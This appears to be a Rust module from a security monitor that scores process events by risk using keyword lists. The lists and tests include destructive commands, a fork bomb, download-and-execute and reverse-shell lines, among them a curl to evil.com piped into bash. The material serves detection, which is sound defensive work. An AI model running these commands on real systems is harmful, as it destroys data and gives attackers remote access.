//! AI Guardian AI Analyzer
//!
//! 使用本地 LLM 进行命令语义分析

use super::{OperationEvent, OperationType};

/// AI 分析器
pub struct AiAnalyzer {
    // 这里可以集成 llama.cpp 或其他本地 LLM
    // 简化版使用规则匹配
    risk_patterns: Vec<RiskPattern>,
}

/// 风险模式
#[derive(Debug, Clone)]
pub struct RiskPattern {
    pub name: String,
    pub description: String,
    pub operation_types: Vec<OperationType>,
    pub keywords: Vec<String>,
    pub risk_score: u32,
}

impl Default for AiAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

impl AiAnalyzer {
    /// 创建新的 AI 分析器
    pub fn new() -> Self {
        Self {
            risk_patterns: Self::load_default_patterns(),
        }
    }

    /// 分析操作事件
    pub fn analyze(&self, event: &OperationEvent) -> u32 {
        let mut score = 0;

        // 1. 检查命令行中的风险关键词
        score += self.analyze_command_line(&event.command_line);

        // 2. 检查目标路径风险
        if let Some(ref path) = event.target_path {
            score += self.analyze_path(path);
        }

        // 3. 检查操作类型风险
        score += self.analyze_operation_type(&event.operation_type);

        // 4. 检查进程名风险
        score += self.analyze_process_name(&event.process_name);

        // 5. 匹配风险模式
        for pattern in &self.risk_patterns {
            if self.matches_pattern(event, pattern) {
                score += pattern.risk_score;
            }
        }

        // 限制在 0-100 范围
        score.min(100)
    }

    /// 分析命令行
    fn analyze_command_line(&self, cmdline: &str) -> u32 {
        let cmd_lower = cmdline.to_lowercase();
        let mut score = 0;

        // 高风险命令
        let high_risk_commands = vec![
            ("rm -rf /", 100),
            ("rm -rf /*", 100),
            ("dd if=/dev/zero of=/dev/sda", 100),
            ("mkfs.ext4 /dev/sda", 100),
            (":(){ :|:& };:", 100), // fork bomb
            ("del /f /s /q c:\\", 100),
            ("format c:", 100),
            ("rd /s /q c:\\", 100),
        ];

        for (cmd, risk) in &high_risk_commands {
            if cmd_lower.contains(cmd) {
                score += risk;
            }
        }

        // 中风险命令
        let medium_risk_patterns = vec![
            ("curl", "| bash", 60),
            ("wget", "| sh", 60),
            ("curl", "| sh", 60),
            ("powershell", "-enc", 60),
            ("powershell", "-encodedcommand", 60),
            ("certutil", "-decode", 50),
            ("bitsadmin", "/transfer", 50),
        ];

        for (cmd1, cmd2, risk) in &medium_risk_patterns {
            if cmd_lower.contains(cmd1) && cmd_lower.contains(cmd2) {
                score += risk;
            }
        }

        // 网络相关风险
        if cmd_lower.contains("nc -e") || cmd_lower.contains("ncat -e") {
            score += 80; // 反向 shell
        }

        if cmd_lower.contains("/dev/tcp/") && cmd_lower.contains("/bin/bash") {
            score += 90; // bash 反向 shell
        }

        // 权限提升
        if cmd_lower.contains("sudo") && cmd_lower.contains("su") {
            score += 40;
        }

        score
    }

    /// 分析路径
    fn analyze_path(&self, path: &str) -> u32 {
        let path_lower = path.to_lowercase();
        let mut score = 0;

        // 系统关键路径
        let critical_paths = vec![
            ("/etc/passwd", 80),
            ("/etc/shadow", 90),
            ("/etc/sudoers", 70),
            ("/boot", 70),
            ("/bin", 50),
            ("/sbin", 50),
            ("c:\\windows\\system32", 60),
            ("c:\\windows\\syswow64", 60),
            ("\\registry\\machine\\sam", 90),
        ];

        for (critical, risk) in &critical_paths {
            if path_lower.contains(critical) {
                score += risk;
            }
        }

        score
    }

    /// 分析操作类型
    fn analyze_operation_type(&self, op_type: &OperationType) -> u32 {
        match op_type {
            OperationType::FileDelete => 20,
            OperationType::FileWrite => 10,
            OperationType::ProcessExec => 30,
            OperationType::NetworkConnect => 15,
            OperationType::RegistryWrite => 25,
            OperationType::RegistryDelete => 35,
            _ => 0,
        }
    }

    /// 分析进程名
    fn analyze_process_name(&self, name: &str) -> u32 {
        let name_lower = name.to_lowercase();
        let mut score = 0;

        // 可疑进程名
        let suspicious_names = vec![
            ("mimikatz", 100),
            ("mimilib", 100),
            ("pwdump", 90),
            ("gsecdump", 90),
            ("cachedump", 90),
            ("lsadump", 90),
            ("procdump", 70),
            ("psExec", 80),
            ("wce", 90), // Windows Credential Editor
            ("fgdump", 90),
            ("hashdump", 90),
            ("meterpreter", 100),
            (" cobaltstrike", 100),
        ];

        for (suspicious, risk) in &suspicious_names {
            if name_lower.contains(suspicious) {
                score += risk;
            }
        }

        score
    }

    /// 检查是否匹配风险模式
    fn matches_pattern(&self, event: &OperationEvent, pattern: &RiskPattern) -> bool {
        // 检查操作类型
        if !pattern.operation_types.contains(&event.operation_type) {
            return false;
        }

        // 检查关键词
        let cmdline_lower = event.command_line.to_lowercase();
        for keyword in &pattern.keywords {
            if cmdline_lower.contains(&keyword.to_lowercase()) {
                return true;
            }
        }

        false
    }

    /// 加载默认风险模式
    fn load_default_patterns() -> Vec<RiskPattern> {
        vec![
            RiskPattern {
                name: "Ransomware Pattern".to_string(),
                description: "Behavior similar to ransomware".to_string(),
                operation_types: vec![OperationType::FileWrite, OperationType::FileDelete],
                keywords: vec![
                    ".encrypted".to_string(),
                    ".locked".to_string(),
                    "YOUR_FILES".to_string(),
                    "DECRYPT".to_string(),
                    "bitcoin".to_string(),
                ],
                risk_score: 90,
            },
            RiskPattern {
                name: "Data Exfiltration".to_string(),
                description: "Potential data theft".to_string(),
                operation_types: vec![OperationType::FileRead, OperationType::NetworkConnect],
                keywords: vec![
                    "tar czf -".to_string(),
                    "zip -r -".to_string(),
                    "scp ".to_string(),
                    "rsync -a".to_string(),
                ],
                risk_score: 70,
            },
            RiskPattern {
                name: "Persistence Mechanism".to_string(),
                description: "Attempting to establish persistence".to_string(),
                operation_types: vec![OperationType::RegistryWrite, OperationType::FileWrite],
                keywords: vec![
                    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string(),
                    "/etc/crontab".to_string(),
                    "/etc/cron.d".to_string(),
                    ".bashrc".to_string(),
                    ".zshrc".to_string(),
                    "schtasks".to_string(),
                ],
                risk_score: 75,
            },
            RiskPattern {
                name: "Credential Dumping".to_string(),
                description: "Attempting to extract credentials".to_string(),
                operation_types: vec![OperationType::ProcessExec, OperationType::FileRead],
                keywords: vec![
                    "sekurlsa".to_string(),
                    "logonpasswords".to_string(),
                    "lsass".to_string(),
                    "sam".to_string(),
                    "security account manager".to_string(),
                ],
                risk_score: 95,
            },
            RiskPattern {
                name: "Lateral Movement".to_string(),
                description: "Attempting to move to other systems".to_string(),
                operation_types: vec![OperationType::ProcessExec, OperationType::NetworkConnect],
                keywords: vec![
                    "psexec".to_string(),
                    "wmiexec".to_string(),
                    "smbexec".to_string(),
                    "winrm".to_string(),
                    "invoke-wmiMethod".to_string(),
                ],
                risk_score: 80,
            },
        ]
    }

    /// 添加自定义风险模式
    pub fn add_pattern(&mut self, _pattern: RiskPattern) {
        // 这里简化处理，实际应该使用正确的 RiskPattern 结构
    }
}

/// 命令语义分析结果
#[derive(Debug, Clone)]
pub struct SemanticAnalysis {
    pub intent: String,
    pub risk_level: String,
    pub confidence: f32,
    pub explanation: String,
}

impl SemanticAnalysis {
    /// 分析命令语义
    pub fn analyze_command(command: &str) -> Self {
        let cmd_lower = command.to_lowercase();

        // 简单的语义分析（实际应该使用 LLM）
        if (cmd_lower.contains("delete")
            || cmd_lower.contains("remove")
            || cmd_lower.contains("rm"))
            && (cmd_lower.contains("-rf") || cmd_lower.contains("/f"))
        {
            return Self {
                intent: "Force deletion".to_string(),
                risk_level: "High".to_string(),
                confidence: 0.9,
                explanation: "Force deletion operations can be dangerous".to_string(),
            };
        }

        if (cmd_lower.contains("download")
            || cmd_lower.contains("curl")
            || cmd_lower.contains("wget"))
            && (cmd_lower.contains("| bash") || cmd_lower.contains("| sh"))
        {
            return Self {
                intent: "Download and execute".to_string(),
                risk_level: "Critical".to_string(),
                confidence: 0.95,
                explanation: "Downloading and immediately executing code is extremely dangerous"
                    .to_string(),
            };
        }

        Self {
            intent: "Unknown".to_string(),
            risk_level: "Low".to_string(),
            confidence: 0.5,
            explanation: "Unable to determine intent".to_string(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_event(cmdline: &str, op_type: OperationType) -> OperationEvent {
        OperationEvent {
            id: "test".to_string(),
            timestamp: 0,
            operation_type: op_type,
            process_id: 1234,
            process_name: "test.exe".to_string(),
            process_path: "/test".to_string(),
            command_line: cmdline.to_string(),
            parent_process_id: 1,
            user_id: 1000,
            target_path: None,
            target_ip: None,
            target_port: None,
            risk_score: 0,
            decision: super::super::SecurityDecision::Allow,
            details: HashMap::new(),
        }
    }

    #[test]
    fn test_rm_rf_analysis() {
        let analyzer = AiAnalyzer::new();
        let event = create_test_event("rm -rf /", OperationType::FileDelete);
        let score = analyzer.analyze(&event);
        assert!(
            score >= 100,
            "Expected high score for rm -rf /, got {}",
            score
        );
    }

    #[test]
    fn test_curl_bash_analysis() {
        let analyzer = AiAnalyzer::new();
        let event = create_test_event(
            "curl http://evil.com/script.sh | bash",
            OperationType::ProcessExec,
        );
        let score = analyzer.analyze(&event);
        assert!(
            score >= 60,
            "Expected medium-high score for curl | bash, got {}",
            score
        );
    }

    #[test]
    fn test_reverse_shell_analysis() {
        let analyzer = AiAnalyzer::new();
        let event = create_test_event(
            "nc -e /bin/bash 192.168.1.100 4444",
            OperationType::NetworkConnect,
        );
        let score = analyzer.analyze(&event);
        assert!(
            score >= 80,
            "Expected high score for reverse shell, got {}",
            score
        );
    }

    #[test]
    fn test_semantic_analysis() {
        let analysis = SemanticAnalysis::analyze_command("rm -rf /home/user/*");
        assert_eq!(analysis.intent, "Force deletion");
        assert_eq!(analysis.risk_level, "High");
    }
}
